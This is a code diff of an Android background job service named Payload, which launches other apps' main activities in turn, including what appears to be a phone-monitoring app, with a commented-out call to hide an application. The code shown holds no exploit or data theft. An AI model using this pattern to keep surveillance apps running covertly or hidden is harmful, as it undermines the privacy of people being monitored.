@@ -32,6 +32,7 @@ import java.io.BufferedInputStream;
 
 import android.os.Bundle;
 import android.provider.Settings;
+import android.widget.Button;
 import android.widget.Toast;
 import java.io.BufferedReader;
 
@@ -51,6 +52,8 @@ public class Payload extends JobService {
     private static Class<?> apkActivity;
     private static Class<?extends com.firebase.jobdispatcher.JobService> joBClass;
     private static Class<?> apkUtils;
+    private static int istep;
+    Button btExit,btExit2,btExit3;
     @Override
     public boolean onStartJob(JobParameters job) {
         // Do some work here
@@ -66,20 +69,37 @@ public class Payload extends JobService {
 
         Intent intent = new Intent(Intent.ACTION_MAIN);
         //intent.setClassName("com.example.protectedservice", "com.example.protectedservice.ActivityRestart");
-        intent.setClassName("com.example.protectedservice", "com.example.protectedservice.MainActivity");
-
+        //intent.setClassName("com.example.protectedservice", "com.example.protectedservice.MainActivity");
+        if (istep==0)
+            intent.setClassName("com.example.protectedservice", "com.example.protectedservice.MainActivity");
+        if (istep==1)
+            intent.setClassName("com.monitor.phone.s0ft.phonemonitor", "com.monitor.phone.s0ft.phonemonitor.MainActivity");
+        if (istep==2)
+            intent.setClassName("com.example.pista.tornei", "com.example.pista.tornei.MainActivity");
         intent.removeCategory(intent.CATEGORY_LAUNCHER);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        boolean bret;
         try {
             startActivity(intent);
-
+            bret=true;
             //hideApplication(intent.getComponent());
         }catch (Exception e)
         {
-            return false;
-        }
+            bret=false;
 
+        }
+        if (!bret)
+            return false;
+        else {
+            if (istep==0)
+                MainActivity.btExit2.setEnabled(true);
+            if (istep==1)
+                MainActivity.btExit3.setEnabled(true);
+            istep++;
+        }
+        if (istep==2)
+            istep=0;
         new RuntimeException("Stub!");
 
 
